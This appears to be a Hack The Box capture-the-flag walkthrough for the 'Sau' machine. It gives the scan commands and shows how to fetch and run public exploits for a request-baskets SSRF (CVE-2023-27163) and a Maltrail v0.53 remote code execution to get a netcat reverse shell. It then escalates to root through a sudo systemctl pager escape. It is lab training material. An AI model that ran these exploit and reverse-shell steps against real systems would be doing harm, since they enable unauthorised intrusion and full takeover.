# Sau - Easy

```sh
sudo vim /etc/hosts
# map sau.htb to target IP

nmap -T4 -p- -A -Pn -v sau.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
    * 55555/tcp - unknown

* From the ```nmap``` scan, we have a lot of filtered, unknown services - these may be internal services that we can't access yet

* The service running on port 55555 is not recognised; we can try interacting with it using ```nc``` or the browser

* On navigating to <http://sau.htb:55555>, on /web, we get a website to "create a basket to collect & inspect HTTP requests" - this is powered by ```request-baskets```, v1.2.1

* Directory scan:

    ```sh
    feroxbuster -u http://sau.htb:55555 -w /usr/share/dirb/wordlists/common.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    ```

* On searching for any exploits associated with the version of ```request-baskets```, we get a SSRF vuln [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

* According to the exploit, we can specify unintended services (such as network-closed apps, running on target localhost) to be accessed by the web app on port 55555; we can check for a few internal services which were filtered in the scan:

    ```sh
    wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh

    chmod +x CVE-2023-27163.sh

    ./CVE-2023-27163.sh http://sau.htb:55555/ http://localhost:80/
    # this creates a basket 'fuvgnd'
    # it will make the request to the internal service on port 80
    ```

* Now, if we access <http://sau.htb:55555/fuvgnd>, we can see the internal service on port 80, which is running Maltrail v0.53

* This version of [Maltrail has an exploit associated](https://github.com/spookier/Maltrail-v0.53-Exploit) with it:

    ```sh
    wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py -O maltrail-v0.53-rce.py

    # setup listener
    nc -nvlp 4444

    python3 maltrail-v0.53-rce.py 10.10.14.33 4444 http://sau.htb:55555/fuvgnd

    # this gives us a reverse shell
    ```

* Now, we have a reverse shell as user 'puma':

    ```sh
    # for stable reverse shell
    export TERM=xterm
    # Ctrl + Z to background shell

    stty raw -echo; fg
    # press Enter twice

    id
    # puma

    ls -la /home

    ls -la /home/puma
    # get user flag

    # check for privesc vectors

    sudo -l
    # puma can run this command as root
    # (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
    ```

* Checking on [GTFOBins](https://gtfobins.github.io/), we have a local privesc vuln for systemctl, associated with CVE-2023-26604 - this can get us root:

    ```sh
    # run the sudo command
    sudo /usr/bin/systemctl status trail.service
    
    # this launches the output in the 'less' pager - we can execute commands here
    !sh
    # this launches root shell

    ls -la /root/
    # get root flag
    ```
